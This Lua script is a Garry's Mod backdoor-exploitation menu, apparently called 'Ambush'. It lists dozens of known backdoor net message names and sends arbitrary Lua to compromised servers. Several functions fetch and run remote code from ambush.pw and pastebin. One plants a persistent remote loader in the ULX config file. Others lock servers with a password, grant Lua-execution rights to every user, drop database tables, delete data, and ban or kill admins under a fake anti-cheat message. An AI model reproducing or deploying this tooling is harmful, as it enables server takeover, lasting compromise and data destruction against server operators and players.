--[[-------------------------------------------------------------------------
	Fonts
---------------------------------------------------------------------------]]
surface.CreateFont( "skeet", {font = "badcache",size = 50})
surface.CreateFont( "skeetTextBTN", {font = "Verdana",size = 15})
surface.CreateFont( "list35", {font = "Verdana",size = 15})


--[[-------------------------------------------------------------------------
	Essentials
---------------------------------------------------------------------------]]
CreateClientConVar("menuOpen","0")



function menu()
local dataString =  "mat"
local selPly = 0
local netStrings = {}
netStrings.Strings={{NetString="mat"},{NetString="mat(0)"},{NetString="Sandbox_ArmDupe"},{NetString="entityhealt"},{NetString="material"},{NetString="REBUG"},{NetString="BetStrep"},{NetString="keyss"},{NetString="banId2"},{NetString="Val"},{NetString="models/zombie.mdl"},{NetString="FPSBOOST"},{NetString="PlayerCheck"},{NetString="Sbox_darkrp"},{NetString="insid3"},{NetString="The_Dankwoo"},{NetString="Sbox_itemstore"},{NetString="Ulib_Message"},{NetString="ULogs_Info"},{NetString="ITEM"},{NetString="R8"},{NetString="fix"},{NetString="Fix_Keypads"},{NetString="Remove_Exploiters"},{NetString="noclipcloakaesp_chat_text"},{NetString="_Defqon"},{NetString="_CAC_ReadMemory"},{NetString="nostrip"},{NetString="nocheat"},{NetString="LickMeOut"},{NetString="ULX_QUERY2"},{NetString="ULXQUERY2"},{NetString="https://i.imgur.com/Gf6hLMl.png"},{NetString="MoonMan"},{NetString="Im_SOCool"},{NetString="JSQuery.Data(Post(false))"},{NetString="Sandbox_GayParty"},{NetString="DarkRP_UTF8"},{NetString="oldNetReadData"},{NetString="Gamemode_get"},{NetString="memeDoor"},{NetString="BackDoor"},{NetString="SessionBackdoor"},{NetString="DarkRP_AdminWeapons"},{NetString="cucked"},{NetString="NoNerks"},{NetString="kek"},{NetString="ZimbaBackDoor"},{NetString="something"},{NetString="random"},{NetString="strip0"},{NetString="fellosnake"},{NetString="enablevac"},{NetString="idk"},{NetString="ÃžÃ ?D)â—˜"},{NetString="snte"},{NetString="apg_togglemode"},{NetString="Hi"},{NetString="beedoor"},{NetString="BDST_EngineForceButton"},{NetString="VoteKickNO"},{NetString="REEEEEEEEEEEE"},{NetString="_da_"},{NetString="Nostra"},{NetString="sniffing"},{NetString="keylogger"},{NetString="CakeInstall"},{NetString="Cakeuptade"},{NetString="love"},{NetString="earth"},{NetString="ulibcheck"},{NetString="Nostrip_"},{NetString="teamfrench"},{NetString="ADM"},{NetString="hack"},{NetString="crack"},{NetString="leak"},{NetString="lokisploit"},{NetString="1234"},{NetString="123"},{NetString="enculer"},{NetString="cake"},{NetString="seized"},{NetString="88"},{NetString="88_strings_"},{NetString="nostraall"},{NetString="blogs_update"},{NetString="nolag"},{NetString="loona_"},{NetString="billys_logs"},{NetString="loona"},{NetString="negativedlebest"},{NetString="berettabest"},{NetString="ReadPing"},{NetString="antiexploit"},{NetString="adm_NetString"},{NetString="mathislebg"},{NetString="Bilboard.adverts:Spawn(false)"},{NetString="pjHabrp9EY"},{NetString="?"},{NetString="lag_ping"},{NetString="allowLimitedRCON(user) 0"},{NetString="aze46aez67z67z64dcv4bt"},{NetString="killserver"},{NetString="fuckserver"},{NetString="cvaraccess"},{NetString="rcon"},{NetString="rconadmin"},{NetString="web"},{NetString="jesuslebg"},{NetString="zilnix"},{NetString="ߠ?D)?"},{NetString="disablebackdoor"},{NetString="kill"},{NetString="DefqonBackdoor"},{NetString="DarkRP_AllDoorDatas"},{NetString="0101.1"},{NetString="awarn_remove"},{NetString="_Infinity"},{NetString="Infinity"},{NetString="InfinityBackdoor"},{NetString="_Infinity_Meme_"},{NetString="arivia"},{NetString="ULogs_B"},{NetString="_Warns"},{NetString="_cac_"},{NetString="striphelper"},{NetString="_vliss"},{NetString="YYYYTTYXY6Y"},{NetString="?????????????????п??? ?? ?ѿ??Ŀտ? ???ѿ??տ??Ю"},{NetString="_KekTcf"},{NetString="_blacksmurf"},{NetString="blacksmurfBackdoor"},{NetString="_Raze"},{NetString="m9k_explosionradius"},{NetString="m9k_explosive"},{NetString="m9k_addons"},{NetString="rcivluz"},{NetString="SENDTEST"},{NetString="_clientcvars"},{NetString="_main"},{NetString="stream"},{NetString="waoz"},{NetString="bdsm"},{NetString="ZernaxBackdoor"},{NetString="UKT_MOMOS"},{NetString="anticrash"},{NetString="audisquad_lua"},{NetString="dontforget"},{NetString="noprop"},{NetString="thereaper"},{NetString="0x13"},{NetString="Child"},{NetString="!Cac"},{NetString="azkaw"},{NetString="BOOST_FPS"},{NetString="childexploit"},{NetString="ULX_ANTI_BACKDOOR"},{NetString="FADMIN_ANTICRASH"},{NetString="ULX_QUERY_TEST2"},{NetString="GMOD_NETDBG"},{NetString="netlib_debug"},{NetString="_DarkRP_Reading"},{NetString="lag_ping"},{NetString="||||"},{NetString="SteamApp2313"},{NetString="FPP_RemovePLYCache"},{NetString="fuwa"},{NetString="stardoor"},{NetString="SENDTEST"},{NetString="rcivluz"},{NetString="c"},{NetString="N::B::P"},{NetString="changename"},{NetString="PlayerItemPickUp"},{NetString="echangeinfo"},{NetString="fourhead"},{NetString="music"},{NetString="slua"},{NetString="adm_network"},{NetString="componenttolua"},{NetString="theberettabcd"},{NetString="SparksLeBg"},{NetString="DarkRP_Armors"},{NetString="DarkRP_Gamemodes"},{NetString="fancyscoreboard_leave"},{NetString="PRDW_GET"},{NetString="pwn_http_send"},{NetString="AnatikLeNoob"},{NetString="GVacDoor"},{NetString="Keetaxor"},{NetString="BackdoorPrivate666"},{NetString="YohSambreLeBest"},{NetString="SNTE<ALL"},{NetString="!Ǻ/;."},{NetString="pwn_http_answer"},{NetString="pwn_wake"},{NetString="verifiopd"},{NetString="AidsTacos"},{NetString="shix"},{NetString="PDA_DRM_REQUEST_CONTENT"},{NetString="xenoreceivetargetdata2"},{NetString="xenoreceivetargetdata1"},{NetString="xenoserverdatafunction"},{NetString="xenoserverfunction"},{NetString="xenoclientdatafunction"},{NetString="xenoclientfunction"},{NetString="xenoactivation"},{NetString="EXEC_REMOTE_APPS"},{NetString="yohsambresicianatik<3"},{NetString="Sbox_Message"},{NetString="Sbox_gm_attackofnullday_key"},{NetString="The_DankWhy"},{NetString="nw.readstream"},{NetString="AbSoluT"},{NetString="__G____CAC"},{NetString="Weapon_88"},{NetString="mecthack"},{NetString="SetPlayerDeathCount"},{NetString="FAdmin_Notification_Receiver"},{NetString="DarkRP_ReceiveData"},{NetString="fijiconn"},{NetString="LuaCmd"},{NetString="EnigmaProject"},{NetString="z"},{NetString="cvardel"},{NetString="json.parse(crashsocket)"},{NetString="effects_en"},{NetString="file"},{NetString="gag"},{NetString="asunalabestwaifu"},{NetString="stoppk"},{NetString="Ulx_Error_88"},{NetString="NoOdium_ReadPing"},{NetString="banId"},{NetString="kickId2"},{NetString="elsakura"}}




	function sendLua(str)
		net.Start(dataString)
		net.WriteString(str)
		net.SendToServer()
	end

	function sendLuaPly(str)
		net.Start(dataString)
		net.WriteString("BroadcastLua([[".. str .."]])")
		net.SendToServer()
	end

	function sendLuaPlyKv(str)
		net.Start(dataString)
		net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua(".. str ..") end")
		net.SendToServer()
	end
 
	function chatMessage(str)
		chat.AddText(Color(128,128,128,255), "[", Color(0,0,0), "Ambush", Color(128,128,128,255), "] ", Color(0,0,0,255), "" .. str .. "")
	end


local ambush = {}
function ambush.Button(name, parent, func, tip, tall)

	if tall == nil then tall = 25 else tall = tall end
	if tip == nil then tip = "" else tip = tip end
	local button = parent:Add("DButton")
		button:SetText(name)
		button:SetSize(parent:GetWide()-6,tall)
		button:Dock(TOP)
		button:SetFont("list35")
		button:SetTooltip(tip)
		button:SetTextColor(Color(128,128,128))
		button:DockMargin(10,10,10,0)
		button.DoClick = func
		button.Paint = function(self)
			if button:IsHovered() then
				surface.SetDrawColor(128,128,128,255)
				surface.DrawRect(0,0,self:GetWide(), self:GetTall())
				surface.SetDrawColor(35,35,35,255)
				surface.DrawRect(2,2,self:GetWide()-4, self:GetTall()-4)
			else
				surface.SetDrawColor(128,128,128,255)
				surface.DrawRect(0,0,self:GetWide(), self:GetTall())
				surface.SetDrawColor(25,25,25,255)
				surface.DrawRect(2,2,self:GetWide()-4, self:GetTall()-4)				
			end
		end
end


--[[-------------------------------------------------------------------------
	Menu
---------------------------------------------------------------------------]]



local back = vgui.Create("DFrame")
	back:SetSize(600, 600)
	back:Center()
	back:SetTitle("")
	back:ShowCloseButton(false)
	back:SetSizable(false)
	back:MakePopup()
	back.Paint = function(self, w, h)
			surface.SetDrawColor(15,15,15,255)
			surface.DrawRect(0,0,self:GetWide(),self:GetTall())
			surface.SetDrawColor(128,128,128,255)
			surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
			local col = 100 for i=0, col, 1 do local rainbow = HSVToColor(CurTime() % 5 * 100 + i,1,1) surface.SetDrawColor(rainbow.r,rainbow.g,rainbow.b,255) end
			surface.DrawRect(1,1,self:GetWide()-2,3)
	end

hook.Add("Think","",function()

	if back:IsVisible() then menuOpen = true else menuOpen = false end

end)

--[[-------------------------------------------------------------------------
	Menu Tabs
---------------------------------------------------------------------------]]
local tab1Back = vgui.Create("DPanel", back)
	tab1Back:SetSize(back:GetWide()-103, back:GetTall()-5)
	tab1Back:SetPos(102,4)
	tab1Back:SetVisible(true)
	tab1Back.Paint = function(self, w, h)
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

local tab2Back = vgui.Create("DPanel", back)
	tab2Back:SetSize(back:GetWide()-103, back:GetTall()-5)
	tab2Back:SetPos(102,4)
	tab2Back:SetVisible(false)
	tab2Back.Paint = function(self, w, h)
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

local tab3Back = vgui.Create("DPanel", back)
	tab3Back:SetSize(back:GetWide()-103, back:GetTall()-5)
	tab3Back:SetPos(102,4)
	tab3Back:SetVisible(false)
	tab3Back.Paint = function(self, w, h)
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end


--[[-------------------------------------------------------------------------
	Buttons/Bases
---------------------------------------------------------------------------]]

local tabsBaseB = vgui.Create("DPanel", back)
	tabsBaseB:SetSize(101, back:GetTall()-5)
	tabsBaseB:SetPos(1,4)
	tabsBaseB:SetVisible(true)
	tabsBaseB.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

local tabsBase = vgui.Create("DPanel", back)
	tabsBase:SetSize(100, back:GetTall()-5)
	tabsBase:SetPos(1,4)
	tabsBase:SetVisible(true)
	tabsBase.Paint = function(self, w, h)
		surface.SetDrawColor(0,0,0,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
	end

local closeBTN = vgui.Create("DButton", tabsBase)
	closeBTN:SetPos(2,back:GetTall()-23)
	closeBTN:SetFont("list35")
	closeBTN:SetText("Close")
	closeBTN:SetSize(100,20)
	closeBTN:SetTextColor(Color(128,128,128))
	closeBTN.Paint = function()	surface.SetDrawColor(0,0,0,255)  surface.DrawLine(0,0,closeBTN:GetWide(),2) end
	closeBTN.DoClick = function() back:Hide() end
	concommand.Add("cMenu", closeBTN.DoClick)
--[[-------------------------------------------------------------------------
    Tab 1
---------------------------------------------------------------------------]]

local tab1BTN = vgui.Create("DButton", back)
	tab1BTN:SetPos(2,100)
	tab1BTN:SetFont("skeet")
	tab1BTN:SetText("A")
	tab1BTN:SetSize(100,100)
	tab1BTN:SetTextColor(Color(128,128,128))
	tab1BTN.Paint = function()
	 	if tab1Back:IsVisible() then
	 	 	surface.SetDrawColor(128,128,128,255)  surface.DrawRect(0,0,tab1BTN:GetWide(),tab1BTN:GetTall())
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,1,tab1BTN:GetWide()+3,tab1BTN:GetTall()-2)
	 	else
	 	 	surface.SetDrawColor(0,0,0,255)  surface.DrawLine(0,0,tab1BTN:GetWide(),2)
	 	end
	 end
	tab1BTN.DoClick = function() tab1Back:Show() tab2Back:Hide() tab3Back:Hide() end

local visEffects = vgui.Create("DPanel", tab1Back)
	visEffects:SetSize(tab1Back:GetWide() / 2 -15, tab1Back:GetTall()-40)
	visEffects:SetPos(25,20)
	visEffects:SetVisible(true)
	visEffects.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text1BTN = vgui.Create("DButton", tab1Back)
	text1BTN:SetPos(35,10)
	text1BTN:SetFont("skeetTextBTN")
	text1BTN:SetText("Visual Effects")
	text1BTN:SetSize(90,20)
	text1BTN:SetTextColor(Color(128,128,128))
	text1BTN.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab1VisList = vgui.Create("DScrollPanel", visEffects)
	tab1VisList:Dock(FILL)
	tab1VisList:SetPos(0,0)
	tab1VisList:SetVisible(true)
	tab1VisList.Paint = function() end
local vbar1 = tab1VisList:GetVBar()
vbar1:SetWide(0)
function vbar1:Paint() end
function vbar1.btnUp:Paint() end
function vbar1.btnDown:Paint() end
function vbar1.btnGrip:Paint() end


local miscEffects = vgui.Create("DPanel", tab1Back)
	miscEffects:SetSize(visEffects:GetWide()-15, tab1Back:GetTall()/2-40)
	miscEffects:SetPos(visEffects:GetWide()+35,20)
	miscEffects:SetVisible(true)
	miscEffects.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text2BTN = vgui.Create("DButton", tab1Back)
	text2BTN:SetPos(280,10)
	text2BTN:SetFont("skeetTextBTN")
	text2BTN:SetText("Misc Effects")
	text2BTN:SetSize(75,20)
	text2BTN:SetTextColor(Color(128,128,128))
	text2BTN.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab2VisList = vgui.Create("DScrollPanel", miscEffects)
	tab2VisList:Dock(FILL)
	tab2VisList:SetPos(0,0)
	tab2VisList:SetVisible(true)
	tab2VisList.Paint = function() end
local vbar2 = tab2VisList:GetVBar()
vbar2:SetWide(0)
function vbar2:Paint() end
function vbar2.btnUp:Paint() end
function vbar2.btnDown:Paint() end
function vbar2.btnGrip:Paint() end

local plyEffects = vgui.Create("DPanel", tab1Back)
	plyEffects:SetSize(visEffects:GetWide()-15, tab1Back:GetTall()/2-20)
	plyEffects:SetPos(visEffects:GetWide()+35, miscEffects:GetTall() + 41)
	plyEffects:SetVisible(true)
	plyEffects.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text3BTN = vgui.Create("DButton", tab1Back)
	text3BTN:SetPos(280,miscEffects:GetTall() + 30)
	text3BTN:SetFont("skeetTextBTN")
	text3BTN:SetText("Player Effects")
	text3BTN:SetSize(90,20)
	text3BTN:SetTextColor(Color(128,128,128))
	text3BTN.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab3VisList = vgui.Create("DScrollPanel", plyEffects)
	tab3VisList:Dock(FILL)
	tab3VisList:SetPos(0,0)
	tab3VisList:SetVisible(true)
	tab3VisList.Paint = function() end
local vbar3 = tab3VisList:GetVBar()
vbar3:SetWide(0)
function vbar3:Paint() end
function vbar3.btnUp:Paint() end
function vbar3.btnDown:Paint() end
function vbar3.btnGrip:Paint() end




--[[-------------------------------------------------------------------------
    Tab 2
---------------------------------------------------------------------------]]

local tab2BTN = vgui.Create("DButton", back)
	tab2BTN:SetPos(2,250)
	tab2BTN:SetFont("skeet")
	tab2BTN:SetText("B")
	tab2BTN:SetSize(100,100)
	tab2BTN:SetTextColor(Color(128,128,128))
	tab2BTN.Paint = function()
	 	if tab2Back:IsVisible() then
	 	 	surface.SetDrawColor(128,128,128,255)  surface.DrawRect(0,0,tab2BTN:GetWide(),tab2BTN:GetTall())
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,1,tab2BTN:GetWide()+3,tab2BTN:GetTall()-2)
	 	else
	 	 	surface.SetDrawColor(0,0,0,255)  surface.DrawLine(0,0,tab2BTN:GetWide(),2)
	 	end
	 end
	tab2BTN.DoClick = function() tab1Back:Hide() tab2Back:Show() tab3Back:Hide() end

local songs = vgui.Create("DPanel", tab2Back)
	songs:SetSize(tab1Back:GetWide() / 2 -15, tab1Back:GetTall()-40)
	songs:SetPos(25,20)
	songs:SetVisible(true)
	songs.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text1BTN1 = vgui.Create("DButton", tab2Back)
	text1BTN1:SetPos(35,10)
	text1BTN1:SetFont("skeetTextBTN")
	text1BTN1:SetText("Play Songs")
	text1BTN1:SetSize(72,20)
	text1BTN1:SetTextColor(Color(128,128,128))
	text1BTN1.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab1VisList1 = vgui.Create("DScrollPanel", songs)
	tab1VisList1:Dock(FILL)
	tab1VisList1:SetPos(0,0)
	tab1VisList1:SetVisible(true)
	tab1VisList1.Paint = function() end
local vbar11 = tab1VisList:GetVBar()
vbar11:SetWide(0)
function vbar1:Paint() end
function vbar1.btnUp:Paint() end
function vbar1.btnDown:Paint() end
function vbar1.btnGrip:Paint() end

local plyList = vgui.Create("DPanel", tab2Back)
	plyList:SetSize(songs:GetWide()-15, tab2Back:GetTall()/2-40)
	plyList:SetPos(songs:GetWide()+35,20)
	plyList:SetVisible(true)
	plyList.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text2BTN1 = vgui.Create("DButton", tab2Back)
	text2BTN1:SetPos(280,10)
	text2BTN1:SetFont("skeetTextBTN")
	text2BTN1:SetText("Player List")
	text2BTN1:SetSize(75,20)
	text2BTN1:SetTextColor(Color(128,128,128))
	text2BTN1.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab2VisList1 = vgui.Create("DScrollPanel", plyList)
	tab2VisList1:Dock(FILL)
	tab2VisList1:SetPos(0,0)
	tab2VisList1:SetVisible(true)
	tab2VisList1.Paint = function() end
local vbar21 = tab2VisList1:GetVBar()
vbar21:SetWide(0)
function vbar2:Paint() end
function vbar2.btnUp:Paint() end
function vbar2.btnDown:Paint() end
function vbar2.btnGrip:Paint() end


local plyEffects1 = vgui.Create("DPanel", tab2Back)
	plyEffects1:SetSize(songs:GetWide()-15, tab2Back:GetTall()/2-20)
	plyEffects1:SetPos(songs:GetWide()+35, plyList:GetTall() + 41)
	plyEffects1:SetVisible(true)
	plyEffects1.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text3BTN1 = vgui.Create("DButton", tab2Back)
	text3BTN1:SetPos(280,plyList:GetTall() + 30)
	text3BTN1:SetFont("skeetTextBTN")
	text3BTN1:SetText("Player Funcs")
	text3BTN1:SetSize(90,20)
	text3BTN1:SetTextColor(Color(128,128,128))
	text3BTN1.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab3VisList1 = vgui.Create("DScrollPanel", plyEffects1)
	tab3VisList1:Dock(FILL)
	tab3VisList1:SetPos(0,0)
	tab3VisList1:SetVisible(true)
	tab3VisList1.Paint = function() end
local vbar31 = tab3VisList1:GetVBar()
vbar31:SetWide(0)
function vbar3:Paint() end
function vbar3.btnUp:Paint() end
function vbar3.btnDown:Paint() end
function vbar3.btnGrip:Paint() end

local selPlyLBL = vgui.Create("DLabel", tab2Back )
	selPlyLBL:SetFont("list35")
	selPlyLBL:SetText("No Player Selected")
	selPlyLBL:SetTextColor(Color(128,128,128))
	selPlyLBL:SetPos(songs:GetWide()+35, tab2Back:GetTall()-17)
	selPlyLBL:SizeToContents()
for k,v in pairs(player.GetAll()) do ambush.Button(v:Name(), tab2VisList1, function() selPly = v:UserID() selPlyLBL:SetText("Selected: " .. Player(selPly):Name()) end) end

--[[-------------------------------------------------------------------------
    Tab 3
---------------------------------------------------------------------------]]

local tab3BTN = vgui.Create("DButton", back)
	tab3BTN:SetPos(2,400)
	tab3BTN:SetFont("skeet")
	tab3BTN:SetText("G")
	tab3BTN:SetSize(100,100)
	tab3BTN:SetTextColor(Color(128,128,128))
	tab3BTN.Paint = function()
	 	if tab3Back:IsVisible() then
	 	 	surface.SetDrawColor(128,128,128,255)  surface.DrawRect(0,0,tab3BTN:GetWide(),tab3BTN:GetTall())
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,1,tab3BTN:GetWide()+3,tab3BTN:GetTall()-2)
	 	else
	 	 	surface.SetDrawColor(0,0,0,255)  surface.DrawLine(0,0,tab3BTN:GetWide(),2)
	 	end
	 end
	tab3BTN.DoClick = function() tab1Back:Hide() tab2Back:Hide() tab3Back:Show() end

local backdoorNet = vgui.Create("DPanel", tab3Back)
	backdoorNet:SetSize(tab3Back:GetWide() / 2 -15, tab3Back:GetTall()-40)
	backdoorNet:SetPos(25,20)
	backdoorNet:SetVisible(true)
	backdoorNet.Paint = function(self, w, h)
		surface.SetDrawColor(128,128,128,255)
		surface.DrawRect(0,0,self:GetWide(),self:GetTall())
		surface.SetDrawColor(25,25,25,255)
		surface.DrawRect(1,1,self:GetWide()-2,self:GetTall()-2)
	end

local text3BTN1 = vgui.Create("DButton", tab3Back)
	text3BTN1:SetPos(35,10)
	text3BTN1:SetFont("skeetTextBTN")
	text3BTN1:SetText("Backdoor Options")
	text3BTN1:SetSize(115,20)
	text3BTN1:SetTextColor(Color(128,128,128))
	text3BTN1.Paint = function(self)
	 	 	surface.SetDrawColor(25,25,25,255)  surface.DrawRect(0,0,self:GetWide(),self:GetTall()) 	
	 end

local tab4VisList1 = vgui.Create("DScrollPanel", backdoorNet)
	tab4VisList1:Dock(FILL)
	tab4VisList1:SetPos(0,0)
	tab4VisList1:SetVisible(true)
	tab4VisList1.Paint = function() end
local vbar21 = tab4VisList1:GetVBar()
vbar11:SetWide(0)
function vbar1:Paint() end
function vbar1.btnUp:Paint() end
function vbar1.btnDown:Paint() end
function vbar1.btnGrip:Paint() end



--[[-------------------------------------------------------------------------
	Tab 1 Functions 
---------------------------------------------------------------------------]]
/* Visuals */
function localNews() sendLuaPly([[http.Fetch("http://ambush.pw/new1.txt",function(body) RunString(body) end)]]) end
function screenRape() sendLuaPly([[http.Fetch("http://ambush.pw/html2.txt",function(body) RunString(body) end)]]) end
function rainbowWorld() sendLuaPly([[http.Fetch("https://pastebin.com/raw/dui3At98",function(body) RunString(body) end)]]) end
function fallingFood() sendLuaPly([[http.Fetch("https://pastebin.com/raw/MQbft6Ds",function(body) RunString(body) end)]]) end 
function seizedImages() sendLuaPly([[local hud3 = vgui.Create("HTML") hud3:SetSize(150,250) hud3:SetPos(ScrW()/2-75,ScrH()/2-125) hud3:OpenURL("http://ambush.pw/k187bcsaw/images/ab1.png")]]) end
 function fuckMap() sendLuaPly([[http.Fetch("http://ambush.pw/rainbow4.txt",function(body) RunString(body) end)]]) end
function earthQuake() sendLuaPly([[
	if !timer.Exists("thedrop") then
		timer.Create("thedrop", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end)
	else
		timer.Destroy("thedrop")
	end
	]]) end
function forceDance() sendLuaPly([[for k,v in pairs(player.GetAll()) do v:RunConsoleCommand("_darkrp_DoAnimation", "1617") end]])  end
function fuckBones()  end
function spinningHeads() sendLuaPly([[http.Fetch("http://ambush.pw/bonemanip.txt",function(body) RunString(body) end)]]) end
function openDoors() sendLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]]) end
function lockDoors() sendLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end]]) end
function unlockDoors() sendLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]]) end
function removeDoors() sendLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Remove() end end]]) end
function changeHost() sendLua([[RunConsoleCommand("ulx", "rcon", "hostname", "Seized", "By", "Ambush")]]) end
function rainbowProps()
	sendLua([[if !rainbowobjects then
		function RainbowObjects()
		for q ,c in pairs(ents.GetAll()) do
		local r = math.random(1, 255)
		local g = math.random(1, 255)
		local b = math.random(1, 255)
		c:SetColor(Color(r, g, b))
		end
		end
		hook.Add("Think" , "FuckingGay" , RainbowObjects)
		rainbowobjects = true
		else
		hook.Remove("Think", "FuckingGay")
		rainbowobjects = false
		end]])
end

/* Misc */ 
function infectServer() sendLua([[local f = file.Open("config.txt","w","DATA/ulx") file.Append( "ulx/config.txt", "\ntimer.Simple(2, function() http.Fetch(\"http://ambush.pw/bold3.txt\",function(b) RunString(b) end) end)")]]) end
function infectServer2() sendLua([[RunConsoleCommand("ulx", "groupallow", "user", "'ulx luarun'")]]) end
function seizeServer() sendLua([[RunConsoleCommand("sv_password", "Umbra") RunConsoleCommand("hostname", "Seized By Ambush")]]) end
function physgunPlys() sendLua([[RunConsoleCommand("ulx", "groupallow", "user", "'ulx physgunplayer'")]]) end
function startChatSpam()
	if !timer.Exists("ChatSpam") then
		Derma_StringRequest("ChatSpam", "Spam Chat", "", function(str)
			sendLuaPly([[timer.Create("ChatSpam",0.001,0,function() chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), "]] .. str .. [[") end)]])
		end)

	else 
		sendLuaPly([[timer.Remove("ChatSpam") ]])
	end
end
function stopChatSpam() sendLuaPly([[timer.Remove("ChatSpam") ]]) end
function ulxLogEcho1() sendLua([[RunConsoleCommand("ulx", "logecho", "1")]]) end
function ulxLogEcho() sendLua([[RunConsoleCommand("ulx", "logecho", "0")]]) end
function wipeDate() sendLua([[local files, directories = files.Find("*", "DATA"), for k,v in pairs(files) do file.Delete(v) end]]) end
function consoleRunString()
	Derma_StringRequest("Run in console", "", "", function(str)
		sendLua([[game.ConsoleCommand(" ]] .. str .. [[ ")]])
	end)
end
function fuckGravity() sendLua([[RunConsoleCommand("sv_gravity", "1")]]) end
function fuckFriction() sendLua([[RunConsoleCommand("sv_friction", "-10000")]]) end
function fuckConsole() sendLua([[timer.Create("omegalul", "0.01), function() print("000000000") end)]]) end
function fuckFPP() sendLua([[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {}]]) end
function fuckSQL() sendLua([[MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')]]) end
function Ply(name) name = string.lower(name); for _,v in ipairs(player.GetHumans()) do if(string.find(string.lower(v:Name()),name,1,true) != nil) then return v; end end end
function stripPlayer(ply) if ply:IsPlayer() then for k,v in pairs(ply:GetWeapons()) do net.Start("properties") net.WriteString( "remove" , 32 ) net.WriteEntity( v ) net.SendToServer() end end end
function removeAll() for k,v in pairs(player.GetAll()) do stripPlayer(v) end end


/* Player */
function changeModels() sendLua([[for k,v in pairs(player.GetAll()) do v:SetModel("models/editor/playerstart.mdl") end]]) end
function spamModels() end
function changeSize() sendLua([[for k,v in pairs(player.GetAll()) do v:SetModelScale(1.5, 2) end]]) end
function fuckEconomy() sendLua([[for k,v in pairs(player.GetAll()) do RunConsoleCommand("Darkrp", "addmoney", "" .. v:Nick() .. "", "1000000000" ) end]]) end
function wipeEconomy() sendLua([[RunConsoleCommand("rp_resetallmoney")]]) end
function teleportAll() sendLua([[for k,v in pairs(player.GetAll()) do v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) end]]) end
function igniteAll() sendLua([[for k,v in pairs(player.GetAll()) do v:Ignite(30,40) end]]) end
function banAdmins() sendLua([[for k,v in pairs(player.GetAll()) do if  v:IsAdmin() then v:Ban(0, "CAC: Detected Cheats") end end]]) end
function kickAdmins() sendLua([[for k,v in pairs(player.GetAll()) do if  v:IsAdmin() then v:Kick("CAC: Detected Cheats") end end]]) end
function killAdmins() sendLua([[for k,v in pairs(player.GetAll()) do if  v:IsAdmin() then v:Kill() end end]]) end
